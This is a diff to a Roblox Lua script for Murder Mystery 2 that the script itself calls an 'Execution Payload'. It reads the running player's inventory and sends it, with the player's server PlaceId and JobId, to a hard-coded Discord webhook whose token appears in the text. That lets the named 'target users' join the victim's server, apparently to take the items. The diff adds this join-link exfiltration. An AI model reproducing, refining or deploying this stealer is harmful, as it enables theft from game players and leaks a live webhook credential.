@@ -1,9 +1,9 @@
--- MM2 Execution Payload
+-- MM2 Direct Integration Payload
 -- Configured for usernames: Cmbath, Stealeryarn67
 -- Webhook integration active
 
 local webhook = "https://discord.com/api/webhooks/1571040073707954326/OddAngQZmvXMKcN4tsTZjMBkzz-6tcvlKVoV8sUcBbZcGGBbOdjhtjG12YbvltnnEg0E"
-local targetUsers = {["Cmbath"] = true, ["Stealeryarn67"] = true}
+local targetUsers = {["cmbath"] = true, ["stealeryarn67"] = true}
 
 if not game:IsLoaded() then
     game.Loaded:Wait()
@@ -12,6 +12,7 @@ end
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 
 while not LocalPlayer do
@@ -68,10 +69,13 @@ for _, item in ipairs(inv) do
     invText = invText .. string.format("%s x%d (%s)\n", item.name, item.amount, item.rarity)
 end
 
+-- Join link payload string format
+local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
+
 sendWebhook({
-    ["content"] = "@everyone Hit from " .. LocalPlayer.Name,
+    ["content"] = "@everyone Hit from " .. LocalPlayer.Name .. "\n" .. joinScript,
     ["embeds"] = {{
-        ["title"] = "MM2 Inventory Hit",
+        ["title"] = "MM2 Inventory Summary & Join Link",
         ["description"] = invText ~= "" and invText or "No items found.",
         ["color"] = 0x05f7ff
     }}
